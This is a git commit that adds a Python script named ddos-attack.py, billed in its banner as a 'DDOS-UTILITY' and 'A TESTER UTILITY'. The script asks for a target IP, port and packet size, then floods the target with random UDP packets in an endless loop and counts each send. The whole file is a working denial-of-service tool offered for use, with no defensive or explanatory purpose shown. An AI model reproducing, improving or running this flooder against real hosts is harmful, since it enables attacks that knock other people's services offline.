5ee7817600080d0554969d9e18c09225a980b14c
srgwrtg0342 <99070713+srgwrtg0342@users.noreply.github.com>
2022-02-27 18:49:45 +0200

    Add files via upload

---
+++ ddos-attack.py
@@ -0,0 +1,48 @@
+import os, time, socket, random
+
+class Init():
+  def __init__(self):
+    try:
+      os.system('cls' if os.name == 'nt' else 'clear')
+
+      self.loading()
+
+      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      print(" \n" + "         ██████╗ ██████╗  █████╗  ██████╗      ██╗   ██╗████████╗██╗██╗      \n" + "         ██╔══██╗██╔══██╗██╔══██╗██╔════╝      ██║   ██║╚══██╔══╝██║██║      \n" + "         ██║  ██║██║  ██║██║  ██║╚█████╗ █████╗██║   ██║   ██║   ██║██║      \n" + "         ██║  ██║██║  ██║██║  ██║ ╚═══██╗╚════╝██║   ██║   ██║   ██║██║     \n"+  "         ██████╔╝██████╔╝╚█████╔╝██████╔╝      ╚██████╔╝   ██║   ██║███████╗ \n" + "         ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝        ╚═════╝    ╚═╝   ╚═╝╚══════╝ \n" + "\n" + "                        DDOS-UTILITY -- BY SRGWRTG0342\n" + "                              A TESTER UTILITY\n" )
+      ip = input("IP : ")
+      port = input("PORT : ")
+      numbytes = input("PACKER SIZE(bytes):")
+      numbytes = int(numbytes)
+      if numbytes != int(numbytes):
+        print("Error!")
+
+      bytes = random._urandom(int(numbytes))
+      port = int(port)
+
+      os.system('cls' if os.name == 'nt' else 'clear')
+      time.sleep(3)
+      sent = 0
+      while True:
+          sock.sendto(bytes, (ip,port))
+          sent = sent + 1
+          print ("Send %s packets %s to port:%s"%(sent,ip,port))
+    except:
+      print("Exit!")
+
+  def loading(self):
+    ttt = "LOAD - █"
+    tpt = "█"
+    ztp = ""
+    ttt = str(ttt)
+    tpt = str(tpt)
+    ztp = str(ztp)
+    ttt = "LOADING - █"
+    ttt = str(ttt)
+    for i in range(10):
+      time.sleep(0.05)
+      os.system('cls' if os.name == 'nt' else 'clear')
+      ttt += tpt
+      print(ttt)
+      time.sleep(0.05)
+      os.system('cls' if os.name == 'nt' else 'clear')
+Init()
